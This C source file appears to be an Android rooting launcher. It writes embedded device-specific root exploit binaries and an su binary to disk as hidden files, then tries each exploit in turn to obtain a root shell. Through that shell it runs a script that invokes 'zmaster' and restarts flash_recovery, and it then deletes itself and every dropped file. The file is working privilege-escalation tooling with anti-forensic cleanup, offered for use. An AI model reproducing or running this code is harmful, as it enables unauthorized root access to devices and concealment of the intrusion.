#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include "binaries.h"
#include "cprocess.h"
#include "zbytearray.h"

//#define DBG(fmt, args...) printf("%s %d: "fmt, __FILE__, __LINE__, ##args);
#define DBG(...)

bool write_file(char *path, unsigned char *data, int size, int mode) {
    unlink(path);
    FILE *fp = fopen(path, "wb");
    if (fp != NULL) {
        fwrite(data, 1, size, fp);
        fflush(fp);
        fclose(fp);
        chmod(path, mode);
        return true;
    }
    return false;
}

int from_string_to_string(const char*m_csSrcString, bool m_check, const char*m_random, char* outbuffer, int outsize);

char su_name[256]; // = "/data/local/tmp/su";
char elf_name[256]; // = "/data/local/tmp/.romaster_root";
char sh_name[256]; // = "/data/local/tmp/.romaster_root.sh";

bool try_vroot(unsigned char *bin, int len) {
    ZByteArray out(false);
    char password[128] = { 0 };
    char cmd[512];

    if (!write_file(elf_name, bin, len, 0755)) {
        DBG("write file fail!\n");
        return false;
    }

    snprintf(cmd, sizeof(cmd), "%s fuck_shuame", elf_name);
    CProcess::exec(cmd, out);
    while (out.endsWith('\r') || out.endsWith('\n')) {
        out.chop(1);
    }
    out.append('\0');

    if (!out.startsWith("fuck_shuame:")) {
        DBG("fuck_shuame response invalid!\n");
        return false;
    }
    out.remove(0, strlen("fuck_shuame:"));
    char *src = strdup(out.data());

    DBG("try get password for '%s'\n", src);
    from_string_to_string(src, 0, 0, password, sizeof(password));
    free(src);
    DBG("test password '%s'\n", password);

    snprintf(cmd, sizeof(cmd), "%s %s /system/bin/sh %s",
             elf_name, password, sh_name);
    CProcess::exec(cmd, out, 10000);
    out.append('\0');
    DBG("result = <%s>\n", out.data());
    if (out.contains("uid=0(root)")) {
        return true;
    }
    return false;
}

void getDirName(char *path, char *out) {
    char *end = strrchr(path, '/');
    *out = '\0';

    if(end == path || end == NULL) {
        return;
    }

    char *p = path;
    char *q = out;
    while(p != end) {
        *q++ = *p++;
    }
    *q = '\0';
}

#define TRY_VROOT(x) {\
    DBG("try %s\n", #x);\
    if(try_vroot(x, sizeof(x))) {\
    DBG("try %s success\n", #x);\
    break;\
    } \
    }

int main(int argc, char *argv[]) {
    char basedir[256];
    getDirName(argv[0], basedir);
    char sh[1024];

    sprintf(su_name, "%s/su", basedir);
    sprintf(elf_name, "%s/.romaster_root", basedir);
    sprintf(sh_name, "%s/.romaster_root.sh", basedir);

    snprintf(sh, sizeof(sh), "#!/system/bin/sh\n"
             "export PATH=$PATH:/system/bin:/system/xbin\n"
             "id\n"
             "%s/zmaster -W -from-vroot\n"
             "stop flash_recovery; start flash_recovery\n"
             "sleep 2\n"
             "%s/zmaster -R -from-vroot\n", basedir, basedir);

    if (argc > 1 && strcmp(argv[1], "-i") == 0) {
        snprintf(sh, sizeof(sh), "#!/system/bin/sh\n"
                 "export PATH=$PATH:/system/bin:/system/xbin\n"
                 "id\n"
                 "%s/zmaster -I -from-vroot\n"
                 "stop flash_recovery; start flash_recovery\n", basedir);
    }

    do {
        if (!write_file(su_name, bin_vroot_su, sizeof(bin_vroot_su), 0755)
                || !write_file(sh_name, (unsigned char *) sh, strlen(sh), 0777)) {
            DBG("write file fail!\n");
            break;
        }

        TRY_VROOT(bin_vroot_i9308);
        TRY_VROOT(bin_vroot267);
        TRY_VROOT(bin_vroot_s4);
        TRY_VROOT(bin_vroot_small);
        TRY_VROOT(bin_vroot_uniscope);
        TRY_VROOT(bin_vroot171);
        TRY_VROOT(bin_vroot292);
        TRY_VROOT(bin_vroot253);
        TRY_VROOT(bin_vroot325);
        TRY_VROOT(bin_vroot477);
        TRY_VROOT(bin_vroot265);
        TRY_VROOT(bin_vroot_p7);

        DBG("vroot failed\n");
    } while (0);

    unlink(argv[0]);
    unlink(su_name);
    unlink(elf_name);
    unlink(sh_name);
    return 0;
}

